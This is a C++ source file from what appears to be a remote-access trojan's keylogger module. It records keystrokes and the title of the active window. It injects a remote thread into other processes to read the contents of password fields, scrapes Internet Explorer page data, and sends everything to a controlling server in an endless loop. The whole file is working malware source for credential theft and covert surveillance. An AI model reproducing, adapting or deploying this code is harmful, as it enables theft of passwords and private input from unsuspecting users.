#include ".\getkeynohookproc.h"
#include ".\getkeynohook.h"
#include "ie.h"
CGetKeyNoHookProc::CGetKeyNoHookProc(void)
{
	PreviousFocus = NULL;
	memset(szIeText, 0, sizeof(szIeText));
	memset(szPassText, 0, sizeof(szPassText));
}

CGetKeyNoHookProc::~CGetKeyNoHookProc(void)
{
}
bool CGetKeyNoHookProc::IsWindowsFocusChange()
{
	HWND hFocus = GetForegroundWindow();   // Retrieve The Active Windows's Focus
	bool ReturnFlag = false;   // Declare The Return Flag
	if (hFocus != PreviousFocus)   // The Active Windows Has Change
	{
		PreviousFocus = hFocus;     // Save The Old Active Windos Focus
		ReturnFlag = TRUE;
	}
	return ReturnFlag;   // Return The Flag
}// End Of IsWindowsFocusChange Function
void CGetKeyNoHookProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 5; 
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}

struct tagRemoteFn
{
	FARPROC pSendMessageW;
	WCHAR szText[256];
	HWND hwnd;
};


#define MAXINJECTSIZE (1024*4)
typedef int (__stdcall * PFN_SENDMESSAGE)(HWND,	UINT , WPARAM, LPARAM );

DWORD WINAPI ThreadGetWindowText(LPVOID lp)
{
	tagRemoteFn* pInfo = (tagRemoteFn*)lp;

	PFN_SENDMESSAGE pSendMessageW = (PFN_SENDMESSAGE)pInfo->pSendMessageW;
	pSendMessageW(pInfo->hwnd, WM_GETTEXT, 256, (LPARAM)pInfo->szText);
	return 0;
}



bool GetRemoteHwndText(HWND hwnd, char* szText)
{

	DWORD dwProcessId;
	GetWindowThreadProcessId(hwnd, &dwProcessId);
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
//	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if(hProcess == NULL)
		return false;
	tagRemoteFn RemoteData;
	HINSTANCE hLibDll = GetModuleHandle(L"User32.dll");
	if(!hLibDll)
		return false;
	RemoteData.pSendMessageW = GetProcAddress(hLibDll, "SendMessageW");
	RemoteData.hwnd = hwnd;
	void *pRemoteThread = VirtualAllocEx(hProcess, 0, MAXINJECTSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (! pRemoteThread)
		return false;
	tagRemoteFn *pData = (tagRemoteFn*)VirtualAllocEx(hProcess, 0, sizeof (tagRemoteFn), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pData)
		return  false;

	if (! WriteProcessMemory(hProcess, pRemoteThread, &ThreadGetWindowText, MAXINJECTSIZE, 0))
		return false;
	memset(RemoteData.szText, 0, sizeof(RemoteData.szText));
	if (! WriteProcessMemory(hProcess, pData, &RemoteData, sizeof (tagRemoteFn), 0))
		return false;
	
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, pData, 0, NULL);
	//HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)ThreadGetWindowText, pData, 0, NULL);
	if(!hThread)
		return false;

	WaitForSingleObject(hThread, 1000);
	BOOL b = ReadProcessMemory(hProcess,  pData, &RemoteData, sizeof (tagRemoteFn), 0);
	VirtualFreeEx(hProcess, pRemoteThread, MAXINJECTSIZE, MEM_RELEASE);
	VirtualFreeEx(hProcess, pData, sizeof (tagRemoteFn), MEM_RELEASE);


	
	strcpy(szText, ATL::CW2A(RemoteData.szText));
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

BOOL CALLBACK EnumChildProc1(          HWND hwnd,
    LPARAM lParam
)
{

	LONG lStyle = ::GetWindowLong(hwnd, GWL_STYLE);
	if (lStyle & ES_PASSWORD)
	{
		char szText[256] = {0};
		GetRemoteHwndText(hwnd, szText);
		if(strlen(szText) != 0)
		{
			char szT[300] = {0};
			sprintf(szT, "\r\nÃÜÂë:%s\r\n", szText);
			strcat((char*)lParam, szT);
		}
	//	::GetWindowTextA(hwnd, szText, 256);
	}

	return TRUE;
}
void CGetKeyNoHookProc::OnCmd_GetKeyLog(tagVipShellCmd* info)
{
	CoInitialize(NULL);
	char szTextIe[400];
	memset(KeyBuffer,0,sizeof(KeyBuffer));
	CGetKeyNoHook hKey;
	while(TRUE)     // Forever Loop Is Taking Place Here
	{
		Sleep(1);   // Rest For A While,And Avoid Taking 100% CPU Usage.Pretty Important To Add This Line Or The System Gets Fucked UP
		if (IsWindowsFocusChange())   //Check The Active Windows Title
		{

			if (strlen(KeyBuffer) != 0)   // Keys Are Pressed
			{
				int nRet = _SendBuffData((BYTE*)SendText, (DWORD)strlen(SendText));
				if(nRet == SOCKET_ERROR)
					return ;
				 // Display The Keys Pressed
				strcat(KeyBuffer, "\r\n");
				nRet = _SendBuffData((BYTE*)KeyBuffer, (DWORD)strlen(KeyBuffer));
				memset(KeyBuffer,0,sizeof(KeyBuffer));     // reset The Buffer
				if(nRet == SOCKET_ERROR)
					return ;
			}
			if(!m_hServer->IsOpened())
				return ;
			memset(SendText, 0, sizeof(SendText));
			char WindowCaption[400] = "";
			GetWindowTextA(PreviousFocus,WindowCaption,400);     // Retrieve The Active Windows's Caption
			if (strlen(WindowCaption) > 0)   // Really Get The Windows's Caption
			{
				
				sprintf(SendText, "\r\nThe Active Windows Title: %s\r\n", WindowCaption);   // Display The Active Windows's Caption
			}
			if(strlen(szIeText) != 0)
			{
				int nRet = _SendBuffData((BYTE*)szIeText, (DWORD)strlen(szIeText));
				if(nRet == SOCKET_ERROR)
						return ;
			}
			if(strlen(szPassText) != 0)
			{
				int nRet = _SendBuffData((BYTE*)szPassText, (DWORD)strlen(szPassText));
				if(nRet == SOCKET_ERROR)
							return ;
			}
			memset(szIeText, 0, sizeof(szIeText));
			memset(szPassText, 0, sizeof(szPassText));
		}
		char* p;
		int nRet = hKey.GetKeyVisual(&p);
		if(p)
		{
			if(nRet == 8)
				KeyBuffer[strlen(KeyBuffer) - 1] = 0;   // One Key Back Then
			else
			{
				EnumChildWindows(PreviousFocus, EnumChildProc1, (LPARAM)szPassText);
				memset(szTextIe, 0, sizeof(szTextIe));
				if( GetIeInfo(PreviousFocus, szTextIe, "ALL") )
				{
					if(strlen(szIeText) == 0)
						strcpy(szIeText, "\r\n----------IE----------\r\n");
					strcat(szIeText, szTextIe);
					strcat(szIeText, "\r\n-------ÎÞµÐ·Ö¸îÏß---------\r\n");
				}

				strcat(KeyBuffer, p);
			}
		}
	}
	CoUninitialize();
}